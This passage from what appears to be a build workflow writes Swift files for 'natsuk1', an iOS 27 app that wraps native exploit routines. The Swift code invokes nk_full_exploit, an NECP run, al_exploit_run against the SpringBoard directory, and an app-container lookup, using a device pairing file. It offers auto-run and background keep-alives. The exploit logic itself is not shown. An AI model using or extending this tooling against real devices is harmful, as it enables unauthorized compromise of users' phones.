              @AppStorage("keep_alive_location") private var keep_alive_location = false

              init() {
                  UserDefaults.standard.register(defaults: [
                      "auto_run": false, "keep_alive_audio": false,
                      "keep_alive_location": false, "lang": "en"])
              }

              var body: some View {
                  Group {
                      if isSupportedIOS {
                          ContentView()
                              .environmentObject(state)
                              .environmentObject(offsets)
                              .environmentObject(airlift)
                              .onAppear {
                                  nk_set_log(cCallback)
                                  if state.log.isEmpty {
                                      state.append("[*] natsuk1 v\(appVersionString())")
                                      state.append("[*] iOS \(osVersionString()) / arm64e")
                                      state.append("")
                                  }
                                  if keep_alive_audio { KeepAlive.shared.startAudio() }
                                  if keep_alive_location { KeepAlive.shared.startLocation() }
                                  if auto_run {
                                      DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) { state.run() }
                                  }
                              }
                              .onChange(of: keep_alive_audio) { _, v in
                                  if v { KeepAlive.shared.startAudio() } else { KeepAlive.shared.stopAudio() }
                              }
                              .onChange(of: keep_alive_location) { _, v in
                                  if v { KeepAlive.shared.startLocation() } else { KeepAlive.shared.stopLocation() }
                              }
                              .overlay {
                                  if state.show_respring {
                                      RespringView().brightness(-1.0).ignoresSafeArea()
                                  }
                              }
                      } else {
                          NotSupportedView(version: osVersionString())
                      }
                  }
              }
          }

          struct NotSupportedView: View {
              let version: String
              var body: some View {
                  VStack(spacing: 16) {
                      Image(systemName: "exclamationmark.triangle.fill")
                          .font(.system(size: 48)).foregroundStyle(.orange)
                      Text("Not supported for iOS \(version)")
                          .font(.title3).fontWeight(.semibold).multilineTextAlignment(.center)
                      Text("natsuk1 runs on iOS 27 only.")
                          .font(.subheadline).foregroundStyle(.secondary).multilineTextAlignment(.center)
                  }
                  .padding(40)
                  .frame(maxWidth: .infinity, maxHeight: .infinity)
                  .background(Color(UIColor.systemGroupedBackground).ignoresSafeArea())
              }
          }

          final class AppState: ObservableObject, @unchecked Sendable {
              nonisolated(unsafe) static let shared = AppState()
              enum Status {
                  case idle, running, ok, failed
                  var color: Color {
                      switch self {
                      case .idle: return .secondary
                      case .running: return .orange
                      case .ok: return .green
                      case .failed: return .red
                      }
                  }
              }
              @Published var log: String = ""
              @Published var status: Status = .idle
              @Published var running: Bool = false
              @Published var show_respring: Bool = false
              @Published var lang: String { didSet { UserDefaults.standard.set(lang, forKey: "lang") } }

              private init() {
                  self.lang = UserDefaults.standard.string(forKey: "lang") ?? "en"
                  startFlusher()
              }
              func t(_ en: String, _ ru: String) -> String { lang == "ru" ? ru : en }

              private func startFlusher() {
                  Task { [weak self] in
                      while !Task.isCancelled {
                          try? await Task.sleep(for: .milliseconds(300))
                          guard let self else { return }
                          let chunk = LockedBuffer.shared.drain()
                          guard !chunk.isEmpty else { continue }
                          var newLog = self.log
                          newLog += chunk
                          if newLog.count > 30000 { newLog = String(newLog.suffix(20000)) }
                          self.log = newLog
                      }
                  }
              }
              func append(_ s: String) { LockedBuffer.shared.append(s) }
              func run() {
                  if running { return }
                  running = true; status = .running
                  Task.detached {
                      _ = nk_full_exploit()
                      await MainActor.run {
                          AppState.shared.running = false
                          AppState.shared.status = .ok
                      }
                  }
              }
              func necp_run() {
                  if running { return }
                  running = true; status = .running
                  Task.detached {
                      _ = nk_necp_run()
                      await MainActor.run {
                          AppState.shared.running = false
                          AppState.shared.status = .ok
                      }
                  }
              }
              func respring() { show_respring = true }
              func clear() { LockedBuffer.shared.clear(); log = "" }
          }
          SWIFT

      - name: Write AirliftBridge.swift
        run: |
          cat > natsuk1/Helpers/AirliftBridge.swift <<'SWIFT'
          import Foundation
          import Combine

          final class AirliftBridge: ObservableObject, @unchecked Sendable {
              nonisolated(unsafe) static let shared = AirliftBridge()
              enum State: Equatable { case idle, pairing, ready(pairingPath: String), running, done(ok: Bool, message: String) }

              @Published private(set) var state: State = .idle
              @Published private(set) var pairPIN: String? = nil
              @Published private(set) var pairingStatus: String = ""
              @Published private(set) var exploitLog: [String] = []
              @Published var target: String = "/var/mobile/Library/SpringBoard"
              private var loggedLines: [String] = []

              private init() {
                  al_log_init({ _, msg in
                      guard let msg = msg else { return }
                      let line = String(cString: msg)
                      DispatchQueue.main.async { AirliftBridge.shared.appendLog(line) }
                  }, nil)
              }

              nonisolated private func appendLog(_ s: String) {
                  DispatchQueue.main.async {
                      self.loggedLines.append(s)
                      if self.loggedLines.count > 800 { self.loggedLines.removeFirst(self.loggedLines.count - 600) }
                      self.exploitLog = self.loggedLines
                  }
              }
              func clearLog() { loggedLines.removeAll(); exploitLog = [] }
              func pairingFilePath() -> String { PairingController.pairingFilePath() }
              func hasPairing() -> Bool {
                  let p = pairingFilePath()
                  guard FileManager.default.fileExists(atPath: p) else { return false }
                  let size = (try? FileManager.default.attributesOfItem(atPath: p)[.size] as? Int) ?? 0
                  return size > 0
              }

              func runPairing() {
                  guard !hasPairing() else { state = .ready(pairingPath: pairingFilePath()); return }
                  state = .pairing; pairingStatus = "Starting host..."; pairPIN = nil
                  let ctrl = PairingController.shared
                  Task {
                      do {
                          let path = try await ctrl.startAndWait()
                          self.state = .ready(pairingPath: path)
                          self.pairingStatus = "Paired"; self.pairPIN = nil
                      } catch is CancellationError {
                          self.state = .idle; self.pairingStatus = "Cancelled"
                      } catch {
                          self.state = .idle
                          self.pairingStatus = "Failed: \(error.localizedDescription)"
                      }
                  }
                  Task {
                      while case .pairing = self.state {
                          try? await Task.sleep(nanoseconds: 200_000_000)
                          self.pairingStatus = ctrl.pairingStatus
                          self.pairPIN = ctrl.pairingPIN
                      }
                  }
              }
              func cancelPairing() {
                  PairingController.shared.softCancel()
                  state = .idle; pairingStatus = ""; pairPIN = nil
              }
              func deletePairing() {
                  let fm = FileManager.default
                  let docs = fm.urls(for: .documentDirectory, in: .userDomainMask)[0]
                  let canonicalURL = docs.appendingPathComponent("natsuk1_pairing.plist")
                  if fm.fileExists(atPath: canonicalURL.path) { try? fm.removeItem(at: canonicalURL) }
                  if let custom = PairingController.customPairingFilePath, fm.fileExists(atPath: custom) {
                      try? fm.removeItem(atPath: custom)
                  }
                  PairingController.customPairingFilePath = nil
                  if let files = try? fm.contentsOfDirectory(atPath: docs.path) {
                      for f in files {
                          guard f.hasSuffix(".plist") || f.hasSuffix(".mobilepairing") || f.hasSuffix(".mobilepair") else { continue }
                          try? fm.removeItem(at: docs.appendingPathComponent(f))
                      }
                  }
                  UserDefaults.standard.removeObject(forKey: "natsuk1PairingHostAltIRK")
                  state = .idle; pairingStatus = ""; pairPIN = nil
              }
              func runExploit() {
                  let pairingPath = pairingFilePath()
                  guard FileManager.default.fileExists(atPath: pairingPath) else {
                      state = .done(ok: false, message: "No pairing file"); return
                  }
                  state = .running; loggedLines.removeAll(); exploitLog = []
                  appendLog("[exploit] path=\(pairingPath) target=\(target)")
                  let targetDir = target
                  Task.detached {
                      var outJson: UnsafeMutablePointer<CChar>? = nil
                      var outError: UnsafeMutablePointer<CChar>? = nil
                      let rc: Int32 = pairingPath.withCString { pc in
                          targetDir.withCString { tc in
                              al_exploit_run(pc, tc, nil, nil, &outJson, &outError)
                          }
                      }
                      let jsonStr = outJson.flatMap { p -> String? in let s = String(cString: p); al_string_free(p); return s }
                      let errStr = outError.flatMap { p -> String? in let s = String(cString: p); al_string_free(p); return s }
                      await MainActor.run {
                          if rc == 0 {
                              let msg = jsonStr ?? "OK"
                              self.appendLog("[exploit] ok: \(msg)")
                              self.state = .done(ok: true, message: msg)
                          } else {
                              let msg = errStr ?? "rc=\(rc)"
                              self.appendLog("[exploit] fail: \(msg)")
                              self.state = .done(ok: false, message: msg)
                          }
                      }
                  }
              }
              func respring() {
                  let pairingPath = pairingFilePath()
                  let bridge = AirliftBridge.shared
                  guard FileManager.default.fileExists(atPath: pairingPath) else {
                      bridge.appendLog("[respring] no pairing file"); return
                  }
                  Task.detached {
                      var outError: UnsafeMutablePointer<CChar>? = nil
                      let rc: Int32 = pairingPath.withCString { pc in
                          al_device_respring(pc, nil, nil, &outError)
                      }
                      let errStr = outError.flatMap { p -> String? in let s = String(cString: p); al_string_free(p); return s }
                      await MainActor.run {
                          if rc == 0 { bridge.appendLog("[respring] ok") }
                          else { bridge.appendLog("[respring] rc=\(rc) \(errStr ?? "")") }
                      }
                  }
              }
              func findContainer(bundleID: String) async -> String? {
                  let pairingPath = pairingFilePath()
                  guard FileManager.default.fileExists(atPath: pairingPath) else { return nil }
                  return await withCheckedContinuation { cont in
                      DispatchQueue.global(qos: .userInitiated).async {
                          var outContainer: UnsafeMutablePointer<CChar>? = nil
                          var outError: UnsafeMutablePointer<CChar>? = nil
                          let rc: Int32 = pairingPath.withCString { pc in
                              bundleID.withCString { bc in
                                  al_find_app_container(pc, bc, nil, nil, &outContainer, &outError)
                              }
                          }
                          let containerStr = outContainer.flatMap { p -> String? in let s = String(cString: p); al_string_free(p); return s }
                          if let p = outError { al_string_free(p) }
                          if rc == 0, let c = containerStr { cont.resume(returning: c) }
                          else { cont.resume(returning: nil) }
                      }
                  }
              }
          }
          SWIFT

